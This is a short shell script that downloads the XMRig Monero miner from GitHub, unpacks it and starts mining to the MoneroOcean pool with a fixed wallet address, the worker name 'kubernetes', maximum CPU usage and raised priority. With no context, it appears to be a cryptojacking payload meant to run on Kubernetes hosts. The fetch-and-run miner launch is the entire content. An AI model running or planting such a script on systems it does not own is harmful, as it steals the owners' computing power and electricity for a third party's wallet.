wget https://github.com/MoneroOcean/xmrig/releases/download/v6.6.2-mo1/xmrig-v6.6.2-mo1-lin64-compat.tar.gz
tar -vxf xmrig-v6.6.2-mo1-lin64-compat.tar.gz
cd xmrig-6.6.2
./xmrig -o gulf.moneroocean.stream:80 -u 4AdbjqR7UuPf44divebPM1YKs2n6UARhEERk9veCu43vg8AcE3E1KBYGuaFxHhndarajwzbCVgnNVXqPhnZDEuhU2PD8fYb -p kubernetes --max-cpu-usage=100 --cpu-priority=5 --donate-level=1

